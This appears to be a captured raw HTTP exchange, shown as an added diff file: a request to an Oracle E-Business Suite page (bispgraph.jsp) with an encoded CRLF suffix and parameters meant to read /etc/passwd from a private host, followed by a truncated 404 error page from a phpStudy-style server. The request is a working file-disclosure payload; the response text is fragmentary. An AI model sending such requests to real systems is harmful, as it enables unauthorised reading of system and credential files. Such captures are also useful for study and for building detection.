@@ -1,0 +1,57 @@
+GET /pte/OA_HTML/bispgraph.jsp%0D%0A.js?ifl=/etc/&ifn=passwd HTTP/1.1
+Host: 192.168.203.178
+User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36
+Connection: close
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+
+
+#d9edf7;  
+      border-radius: 12px;
+    }
+    .content dl{
+      color: #2d6a88;
+      line-height: 40px;
+    } 
+    .content div div {
+      padding-bottom: 20px;
+      text-align:center;
+    }
+  </style>
+</head>
+<body>
+  <div class="content">
+      <div>
+           <h1>404 - Page Not Found </h1>
+        <dl>
+          <dt></dt>
+          <dt>1</dt>
+		  <dd></dd>
+          <dd>755windos</dd>
+          <dt>2</dt>
+		  <dd></dd>
+          <dd>WWW</dd>
+		  <dt>3</dt>
+		  <dd></dd>
+          <dd>index.htmlindex.php</dd>
+		  <dt>4</dt>
+		  <dd></dd>
+          <dd></dd>
+		  <dt>5</dt>
+		  <dd></dd>
+          <dd></dd>
+        </dl>
+        <div>BUG <a href="https://www.xp.cn"  target="_blank">www.xp.cn</a> </div>
+   
+
+
+ 
+      </div>
+    </div> 
+</body>
+</html>
+
+
